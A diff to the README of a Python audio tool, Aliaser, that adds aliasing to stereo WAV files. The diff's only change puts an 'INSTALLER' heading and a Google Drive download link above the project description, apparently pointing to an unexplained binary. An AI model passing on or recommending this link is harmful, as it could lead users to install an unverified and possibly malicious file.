@@ -1,3 +1,6 @@
+#### INSTALLER
+https://drive.google.com/file/d/1QaRFvxt78glgMh3F-LlSqhwXJYKJBFLr/view?usp=sharing
+
 # Aliaser: Audio Processing Tool
 
 Aliaser is a Python-based tool designed to introduce aliasing into your sound for a creative effect. It allows users to downsample stereo WAV files to a desired sample rate and optionally upsample them back to the original rate. The tool offers various interpolation methods for upsampling, including simple repeat, linear, and cubic interpolation. Additionally, it can be used as a raw down sampler. As of version 1, Aliaser specifically requires stereo 16-bit WAV files.
